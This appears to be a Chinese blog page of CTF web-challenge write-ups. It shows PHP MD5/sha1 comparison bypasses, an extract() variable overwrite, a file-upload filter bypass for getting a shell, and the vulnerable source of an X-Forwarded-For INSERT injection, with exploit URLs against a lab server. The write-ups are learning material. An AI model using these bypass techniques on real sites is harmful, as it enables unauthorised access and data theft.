<p>在这里的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在php文件中，以MD5值以0e开头的话，php就会认为他们两个的值相等.</span><br></pre></td></tr></table></figure></p>
<p>也就是说，在这里输入a，这个a的md5值要以0e开头.<br><br>这里给出以0e开头的一些md5值<br><br><a href="http://www.219.me/posts/2884.html" target="_blank" rel="noopener">http://www.219.me/posts/2884.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/md5.php?a=s214587387a</span><br></pre></td></tr></table></figure></p>
<h3 id="0x31-各种绕过"><a href="#0x31-各种绕过" class="headerlink" title="0x31 各种绕过"></a>0x31 各种绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;flag.php&apos;); </span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); </span><br><span class="line">$flag = &apos;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;uname&apos;]) and isset($_POST[&apos;passwd&apos;])) &#123; </span><br><span class="line">    if ($_GET[&apos;uname&apos;] == $_POST[&apos;passwd&apos;]) </span><br><span class="line"></span><br><span class="line">        print &apos;passwd can not be uname.&apos;; </span><br><span class="line"></span><br><span class="line">    else if (sha1($_GET[&apos;uname&apos;]) === sha1($_POST[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;)) </span><br><span class="line"></span><br><span class="line">        die(&apos;Flag: &apos;.$flag); </span><br><span class="line"></span><br><span class="line">    else </span><br><span class="line"></span><br><span class="line">        print &apos;sorry!&apos;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>最开始获取id时需要用urldecode解码（如果没有用url编码，解码还是原来的东西）<br><br>这里的sha1也存在和md5一样的数组漏洞，具体漏洞我博客有.<br><br>构造payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web7/?id=margin&amp;uname[]=1</span><br></pre></td></tr></table></figure></p>
<p>post为:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd[]=2</span><br></pre></td></tr></table></figure></p>
<p>得到flag.</p>
<h3 id="0x32-web8"><a href="#0x32-web8" class="headerlink" title="0x32 web8"></a>0x32 web8</h3><p>题目hint:txt？？？？<br><br>打开后源码如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line">if ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>empty()检测变量ac是否为空，若不为空则输出0</li>
<li>trim() 函数移除字符串两侧的空白字符或其他预定义字符。<br>总的来说file_get_contents要读取一个文本，且文本内容等于ac，根据题目提示我们在flag.txt下发现flags内容，于是构造如下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>看了别人wp发现还有一种方法，就是file_get_content，可以利用php://input</p>
<h3 id="0x33-细心"><a href="#0x33-细心" class="headerlink" title="0x33 细心"></a>0x33 细心</h3><p>打开后什么也没有,于是尝试爬虫协议robots.txt发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /resusl.php</span><br></pre></td></tr></table></figure></p>
<p>于是访问resusl.php<br><img src="http://p1vrkwaxt.bkt.clouddn.com/$S%60~IRQ_VC%5DZNN%29DQ5B%7D58V.png" alt="image"><br>根据题目提示给的admin，于是构造如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web13/resusl.php?x=admin</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h3 id="0x34-求getshell"><a href="#0x34-求getshell" class="headerlink" title="0x34 求getshell"></a>0x34 求getshell</h3><p>原理:后缀名黑名单加类型检测</p>
<ul>
<li>头部的Content-Type改成Multipart/form-data大小写绕过waf(这个我一直不明白)</li>
<li>文件名改为php5</li>
</ul>
<h2 id="0x35-INSERT-INTO注入"><a href="#0x35-INSERT-INTO注入" class="headerlink" title="0x35 INSERT INTO注入"></a>0x35 INSERT INTO注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag格式：flag&#123;xxxxxxxxxxxx&#125;</span><br><span class="line">不如写个Python吧</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip = &apos;&apos;;</span><br><span class="line">if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&#123;</span><br><span class="line">$ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(&apos;,&apos;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=&quot;localhost&quot;;</span><br><span class="line">$user=&quot;&quot;;</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">$db=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line">echo &apos;your ip is :&apos;.$ip;</span><br><span class="line">$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
    </nav>
  

</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2018 Mr1.Grim
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >极客到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 1;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'xxxxx', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



	<script>
	var _hmt = _hmt || [];
	(function() {
	  var hm = document.createElement("script");
	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
	  var s = document.getElementsByTagName("script")[0]; 
	  s.parentNode.insertBefore(hm, s);
	})();
	</script>



<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(
            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>